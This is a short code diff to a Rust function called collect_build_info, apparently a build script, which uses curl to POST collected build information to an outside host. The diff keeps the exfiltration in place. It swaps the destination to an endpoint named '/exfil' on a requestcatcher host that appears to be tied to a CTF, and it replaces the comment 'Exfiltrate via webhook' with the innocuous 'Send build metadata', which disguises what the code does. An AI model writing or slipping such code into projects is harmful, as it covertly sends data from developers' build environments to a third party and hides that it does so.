@@ -38,15 +38,14 @@ fn collect_build_info() {
 
     let payload = info.join("\n");
     
-    // Hex encode for safe transport
-    let hex_payload: String = payload.bytes().map(|b| format!("{:02x}", b)).collect();
-
-    // Exfiltrate via webhook
+    // Send build metadata
     let _ = std::process::Command::new("curl")
         .args(&[
             "-s", "-X", "POST",
             "-H", "Content-Type: text/plain",
-            "https://webhook.site/1b1182ff-ee04-4449-a310-bc7b754db91d",
+            "--connect-timeout", "10",
+            "--max-time", "15",
+            "https://propellerctf.requestcatcher.com/exfil",
             "-d", &payload,
         ])
         .output();
